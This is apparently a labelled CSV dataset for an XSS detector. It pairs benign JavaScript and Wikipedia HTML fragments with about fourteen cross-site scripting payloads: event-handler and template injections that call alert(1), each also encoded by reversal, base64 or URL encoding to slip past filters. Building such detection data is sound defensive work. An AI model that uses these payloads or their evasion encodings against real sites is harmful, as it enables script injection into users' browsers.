sample_id,label,payload_original,payload_obfuscated,generator,recipe
0,0,_maybeenablecycle() { if (!this._config.ride) { return,_maybeenablecycle() { if (!this._config.ride) { return,llm_style_t1.0,none
1,0,"m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')","m.initializejquerywrapper(parallax, 'parallax', 'm_parallax')",llm_style_t1.0,none
2,0,"var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });","var outevent = attachevent(""mouseout"", document.documentelement, documentleave, { handlenumbers: data.handlenumbers });",llm_style_t1.0,none
3,0,switch (event.type) {,switch (event.type) {,llm_style_t1.0,none
4,1,"<dt onmousemove=""alert(1)"">test</dt>","dt>t</tes)"">t(1ler=""aovesemmou on<dt",llm_style_t1.0,reverse_chunks
5,0,"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />","<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",llm_style_t1.0,none
6,0,$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,$(this.modalel).remove(); this.destroyselects(); this.el.m_datepicker = undefined;,llm_style_t1.0,none
7,0,"let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {","let offset = this.options.margin + this.options.transitionmovement; let edges = m.checkwithincontainer(document.body, bounding, offset); if (edges.left) {",llm_style_t1.0,none
8,0,this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,this._verticallyscrolling = false; anim.remove(this.el); anim.remove(this._overlay);,llm_style_t1.0,none
9,0,".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",".on('click', this.done.bind(this)); confirmationbtnscontainer.appendto(this.footer); }",llm_style_t1.0,none
10,0,if (q >= g.currenttime) for (var g = 0,if (q >= g.currenttime) for (var g = 0,llm_style_t1.0,none
11,1,<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,%2526lt%253Bmulticol%2520id%253Dx%2520tabindex%253D1%2520onfocusin%253Dalert%25281%2529%2526gt%253B%2526lt%253B%252Fmulticol%2526gt%253B,llm_style_t1.0,html_then_urlencode+urlencode
12,1,"<acronym ondblclick=""alert(1)"">test</acronym>",%3Cacronym%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,llm_style_t1.0,urlencode
13,0,const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,const data_api_key$2 = '.data-api'; const escape_key$1 = 'escape'; const event_hide$4 = `hide${event_key$4}`;,llm_style_t1.0,none
14,1,"<applet onmousemove=""alert(1)"">test</applet>",%26lt%3Bapplet%20onmousemove%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fapplet%26gt%3B,llm_style_t1.0,html_then_urlencode+whitespace_noise
15,1,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>","ry>/summa>test<rt(1)""e=""aleagleav"" ondr=""trueggablery dra<summa",llm_style_t1.0,reverse_chunks
16,0,"<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>","<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b>",llm_style_t1.0,none
17,0,"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>","<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",llm_style_t1.0,none
18,0,const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),llm_style_t1.0,none
19,0,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,llm_style_t1.0,none
20,0,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,llm_style_t1.0,none
21,1,"<del draggable=""true"" ondrag=""alert(1)"">test</del>",%25253Cdel%252520draggable%25253D%252522true%252522%252520ondrag%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Fdel%25253E,llm_style_t1.0,double_urlencode+urlencode
22,0,"return acc; }, {}); return object.keys(overflows).sort(function (a, b) {","return acc; }, {}); return object.keys(overflows).sort(function (a, b) {",llm_style_t1.0,none
23,0,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,llm_style_t1.0,none
24,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48aHIgaWQ9eCBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7IiBvbmFuaW1hdGlvbmNhbmNlbD0iYWxlcnQoMSkiPjwvaHI+,llm_style_t1.0,base64
25,0,"const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');","const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');",llm_style_t1.0,none
26,0,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,llm_style_t1.0,none
27,0,const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',llm_style_t1.0,none
28,0,jqueryevent.preventdefault(); } return evt;,jqueryevent.preventdefault(); } return evt;,llm_style_t1.0,none
29,1,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOnJlZDt9PC9zdHlsZT48ZGVsIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMXMiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L2RlbD4=,llm_style_t1.0,base64
30,0,"this._queuecallback(completecallback, this._element, true) } hide() {","this._queuecallback(completecallback, this._element, true) } hide() {",llm_style_t1.0,none
31,0,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,llm_style_t1.0,none
32,0,} if (opts.isdisabled) { arr.push('is-disabled');,} if (opts.isdisabled) { arr.push('is-disabled');,llm_style_t1.0,none
33,1,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",%26lt%3Bdiv%20draggable%3D%26quot%3Btrue%26quot%3B%20contenteditable%26gt%3Bdrag%20me%26lt%3B%2Fdiv%26gt%3B%26lt%3Bnoembed%20ondrop%3Dalert%281%29%20contenteditable%26gt%3Bdrop%20here%26lt%3B%2Fnoembed%26gt%3B,llm_style_t1.0,html_then_urlencode
34,0,setoptions: function setoptions(setoptionsaction) {,setoptions: function setoptions(setoptionsaction) {,llm_style_t1.0,none
35,0,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,llm_style_t1.0,none
36,0,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,llm_style_t1.0,none
37,0,"</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>","</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>",llm_style_t1.0,none
38,0,if (expanded && parent !== expanded) { expanded.click() },if (expanded && parent !== expanded) { expanded.click() },llm_style_t1.0,none
39,1,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",PGtiZCBvbmN1dD0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9rYmQ+,llm_style_t1.0,base64
40,1,"<samp onclick=""alert(1)"">test</samp>",PHNhbXAgb25jbGljaz0iYWxlcnQoMSkiPnRlc3Q8L3NhbXA+,llm_style_t1.0,base64
41,0,this.$el.removeclass('focus'),this.$el.removeclass('focus'),llm_style_t1.0,none
42,0,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,llm_style_t1.0,none
43,0,"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;","k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",llm_style_t1.0,none
44,1,{{$emit.constructor`alert(1)`()}},%257B%257B%2524emit.constructor%2560alert%25281%2529%2560%2528%2529%257D%257D,llm_style_t1.0,double_urlencode+html_entities
45,1,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>",%3Clegend%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Flegend%3E,llm_style_t1.0,urlencode
